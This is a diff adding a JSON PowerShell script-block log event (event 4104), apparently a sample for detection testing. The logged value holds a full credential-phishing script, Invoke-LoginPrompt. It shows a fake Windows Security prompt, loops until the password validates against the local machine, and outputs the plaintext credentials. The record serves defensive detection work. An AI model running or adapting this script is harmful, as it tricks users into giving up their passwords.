@@ -1,0 +1,10 @@
+{
+  "time": "2019-09-09t13:35:09.3152300z",
+  "event_src.title": "microsoft-windows-powershell",
+  "event_src.subsys": "powershell",
+  "event_src.vendor": "microsoft",
+  "event_src.hostname": "msedgewin10",
+  "event_src.id": "4104",
+  "event_src.category": "microsoft-windows-powershell/operational",
+  "object.value": "function invoke-loginprompt{ $cred = $host.ui.promptforcredential(\"windows security\", \"please enter user credentials\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.getnetworkcredential().password add-type -assemblyname system.directoryservices.accountmanagement $ds = new-object system.directoryservices.accountmanagement.principalcontext([system.directoryservices.accountmanagement.contexttype]::machine) while($ds.validatecredentials(\"$full\",\"$password\") -ne $true){ $cred = $host.ui.promptforcredential(\"windows security\", \"invalid credentials, please try again\", \"$env:userdomain\\$env:username\",\"\") $username = \"$env:username\" $domain = \"$env:userdomain\" $full = \"$domain\" + \"\\\" + \"$username\" $password = $cred.getnetworkcredential().password add-type -assemblyname system.directoryservices.accountmanagement $ds = new-object system.directoryservices.accountmanagement.principalcontext([system.directoryservices.accountmanagement.contexttype]::machine) $ds.validatecredentials(\"$full\", \"$password\") | out-null } $output = $newcred = $cred.getnetworkcredential() | select-object username, domain, password $output r{start_process} } invoke-loginprompt"
+}
